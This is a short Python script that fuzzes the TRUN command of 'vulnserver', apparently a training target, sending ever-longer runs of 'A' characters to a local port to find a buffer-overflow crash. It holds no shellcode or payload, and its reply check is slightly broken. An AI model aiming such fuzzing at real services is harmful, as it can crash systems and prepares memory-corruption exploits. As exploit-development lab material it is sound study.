import socket
import sys
import pickle
import errno

buffer_size= 100






'''
generate buffer

''' 
while True:

    #Create plattern
    payload = "TRUN .".ljust(buffer_size, "A")
    payload +="BBBB"

     
    print("Fuzzing vulnserver")
    #Create socket
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #set source IP
    s.bind(('0.0.0.0',0))
    #print buffer length
    print("Sending buffer of %s " % len(payload))
    #connect to port 9999, the default
    s.connect(('127.0.0.1',9999))
    #encoding buffer
    string_data =  payload.encode()

    #sending buffer to host
    s.send((string_data))
    #notify that a connection was made and gets a source port number 
    print("Made a connection", s.getsockname()[1])

    '''
    If the server resonse with turn complete then the server is up.

    If the server is not responding then exception occurs. 
    '''
    if str(s.recv(1024)) == "TRUN COMPLETE":
        print("We have recieved a reply. TRUN COMPLETE")
        print("print the server didn't crash.")
    else:
        try:
            #sets the timeout with a value of 1 second
            s.settimeout(1)
            #prints the receiving message
            print(s.recv(1024))
        #handles the exception
        except Exception as serr:
            
            if serr.errno == errno.ECONNREFUSED:
                print("Server not running. or has crashed. Was the server on to begin with?")
        else:
            print("nothing happened. ")
        finally:
            print("Good bye!")
        
        s.close()


    buffer_size+=100






